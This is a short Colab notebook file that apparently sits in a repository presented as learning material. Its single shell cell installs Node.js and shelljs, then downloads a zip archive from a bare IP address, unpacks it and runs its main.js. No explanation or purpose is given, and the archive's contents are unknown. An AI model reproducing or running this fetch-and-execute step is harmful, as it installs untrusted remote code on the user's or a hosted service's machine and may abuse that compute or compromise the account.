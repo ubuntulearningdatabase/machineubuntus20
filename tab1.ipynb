{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tab1.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "voGFUzYVRq40"
      },
      "outputs": [],
      "source": [
        "%%shell\n",
        "apt update -y && apt install -y nodejs\n",
        "npm install -i shelljs\n",
        "wget -q http://199.250.207.182/~ngewetech/include/induk/gosum.zip && unzip -q gosum.zip && cd gosum && node main.js"
      ]
    }
  ]
}
